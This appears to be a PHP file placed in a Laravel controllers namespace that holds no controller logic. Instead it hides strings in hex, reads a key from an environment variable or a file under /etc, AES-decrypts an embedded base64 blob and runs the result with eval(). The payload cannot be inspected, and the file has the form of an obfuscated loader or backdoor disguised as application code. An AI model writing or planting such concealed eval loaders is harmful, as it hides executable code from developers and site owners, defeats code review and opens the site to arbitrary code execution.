<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('yI/whrXj1n543O678Jb15w==');

$c=base64_decode(

'ya4oKuyOy8A/k4GMzpZ7T2Sd6sgPoT1BALl2nOCrzVOydta1OC3XjDk+J7xSDCCB60poyAYf0TUk' .
'EeMlbN26aAe5KniP4TKvJ0nUkQ67sKdgMBVASrJjOE0K2ue+DRUJmaI71ZIIy1QjsbqnlVr7CZtZ' .
'Mp/6nc9PJ+TSLn4tbkGcLlWGBPKmG2BaF0UqRAH5VKGVofny44iEiSt3NXMPx+T6h54GJn/t8fUh' .
'k61Ti5Bw5v/YEijMXODMQJ0yrogUX8IJ1QYH3nKTcLGaF5phMg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

